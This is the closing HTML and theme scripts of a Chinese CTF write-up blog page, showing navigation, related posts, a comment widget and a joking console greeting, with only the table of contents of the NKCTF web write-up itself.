}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://cszvvds.cc" target="_blank">VV</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/wp/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>wp<span class="tagsPageCount">5</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/05/13/2023-NewstarCTF-wp/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2023-NewstarCTF-wp</div></div></a></div><div class="next-post pull-right"><a href="/2024/05/15/2023-XYCTF-wp/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2023-XYCTF-wp</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/05/15/2023-%E7%AC%AC%E4%B8%80%E5%B1%8A%E2%80%9C%E5%B8%95%E9%B2%81%E6%9D%AF%E2%80%9DCTF-wp/" title="2023-第一届“帕鲁杯”CTF-wp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-15</div><div class="title">2023-第一届“帕鲁杯”CTF-wp</div></div></a></div><div><a href="/2024/05/15/2023-%E8%93%9D%E6%A1%A5%E6%9D%AF-wp/" title="2023-蓝桥杯-wp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-15</div><div class="title">2023-蓝桥杯-wp</div></div></a></div><div><a href="/2024/05/15/2023-XYCTF-wp/" title="2023-XYCTF-wp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-15</div><div class="title">2023-XYCTF-wp</div></div></a></div><div><a href="/2024/05/13/2023-NewstarCTF-wp/" title="2023-NewstarCTF-wp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-13</div><div class="title">2023-NewstarCTF-wp</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2021/03/03/e511960ac5488.png" alt="status"/></div></div><div class="author-info__description">生活明朗 万物可爱</div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">大家好 我是VV 欢迎来看我的博客鸭~  之前上传文章的时候 图床好像被DDOS了 有些图片没上传起 懒的重新弄了 大家需要的话d我 我重新上传</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NKCTF-WP-WEB"><span class="toc-number">1.</span> <span class="toc-text">NKCTF WP WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C"><span class="toc-number">1.1.</span> <span class="toc-text">结果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#my-first-cms"><span class="toc-number">1.2.</span> <span class="toc-text">my first cms</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A8%E4%B8%96%E7%95%8C%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84CTF"><span class="toc-number">1.3.</span> <span class="toc-text">全世界最简单的CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%951"><span class="toc-number">1.3.1.</span> <span class="toc-text">法1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%952"><span class="toc-number">1.3.2.</span> <span class="toc-text">法2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%953"><span class="toc-number">1.3.3.</span> <span class="toc-text">法3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#attack-tacoooooooo"><span class="toc-number">1.4.</span> <span class="toc-text">attack_tacoooooooo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E8%BF%87%E5%B0%B1%E6%98%AF%E7%86%9F%E6%82%89"><span class="toc-number">1.5.</span> <span class="toc-text">用过就是熟悉</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/15/2023-%E8%93%9D%E6%A1%A5%E6%9D%AF-wp/" title="2023-蓝桥杯-wp">2023-蓝桥杯-wp</a><time datetime="2024-05-15T02:39:09.000Z" title="发表于 2024-05-15 10:39:09">2024-05-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/15/2023-%E7%AC%AC%E4%B8%80%E5%B1%8A%E2%80%9C%E5%B8%95%E9%B2%81%E6%9D%AF%E2%80%9DCTF-wp/" title="2023-第一届“帕鲁杯”CTF-wp">2023-第一届“帕鲁杯”CTF-wp</a><time datetime="2024-05-15T02:36:58.000Z" title="发表于 2024-05-15 10:36:58">2024-05-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/15/2023-XYCTF-wp/" title="2023-XYCTF-wp">2023-XYCTF-wp</a><time datetime="2024-05-15T02:31:24.000Z" title="发表于 2024-05-15 10:31:24">2024-05-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/15/2023-NKCTF-wp/" title="2023-NKCTF-wp">2023-NKCTF-wp</a><time datetime="2024-05-15T02:27:01.000Z" title="发表于 2024-05-15 10:27:01">2024-05-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/13/2023-NewstarCTF-wp/" title="2023-NewstarCTF-wp">2023-NewstarCTF-wp</a><time datetime="2024-05-13T10:41:32.000Z" title="发表于 2024-05-13 18:41:32">2024-05-13</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 By VVkladg0r</div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">2</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" href="https://cszvvds.cc" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 文章总览</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 全部分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 全部标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言面板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/java/" style="font-size: 0.88rem;">java<sup>1</sup></a><a href="/tags/misc/" style="font-size: 0.88rem;">misc<sup>1</sup></a><a href="/tags/web/" style="font-size: 0.88rem;">web<sup>7</sup></a><a href="/tags/wp/" style="font-size: 0.88rem;">wp<sup>5</sup></a><a href="/tags/%E5%85%B6%E4%BB%96/" style="font-size: 0.88rem;">其他<sup>5</sup></a><a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 0.88rem;">内网<sup>1</sup></a><a href="/tags/%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E/" style="font-size: 0.88rem;">后端漏洞<sup>5</sup></a><a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 0.88rem;">工具<sup>2</sup></a><a href="/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" style="font-size: 0.88rem;">编程语言<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2024 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 VVkladg0r 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const initWaline = () => {
    const waline = Waline.init(Object.assign({
      el: '#waline-wrap',
      serverURL: 'waline.cszvvds.cc',
      pageview: false,
      dark: 'html[data-theme="dark"]',
      path: window.location.pathname,
      comment: false,
    }, null))
  }

  const loadWaline = async () => {
    if (typeof Waline === 'object') initWaline()
    else {
      await getCSS('https://cdn.cbd.int/@waline/client@2.15.5/dist/waline.css')
      await getScript('https://cdn.cbd.int/@waline/client@2.15.5/dist/waline.js')
      initWaline()
    }
  }

  if ('Waline' === 'Waline' || !true) {
    if (true) anzhiyu.loadComment(document.getElementById('waline-wrap'),loadWaline)
    else setTimeout(loadWaline, 0)
  } else {
    window.loadOtherComment = loadWaline
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
  const changeContent = content => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = async () => {
    try {
      const res = await fetch('waline.cszvvds.cc/api/comment?type=recent&count=6', { method: 'GET' })
      const result = await res.json()
      const walineArray = result.data.map(e => {
        return {
          'content': changeContent(e.comment),
          'avatar': e.avatar,
          'nick': e.nick,
          'url': e.url + '#' + e.objectId,
          'date': e.time || e.insertedAt
        }
      })
      saveToLocal.set('waline-newest-comments', JSON.stringify(walineArray), 10/(60*24))
      generateHtml(walineArray)
    } catch (err) {
      console.error(err)
      const $dom = document.querySelector('#card-newest-comments .aside-list')
      $dom.textContent= "无法获取评论，请确认相关配置是否正确"
    }
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('waline-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>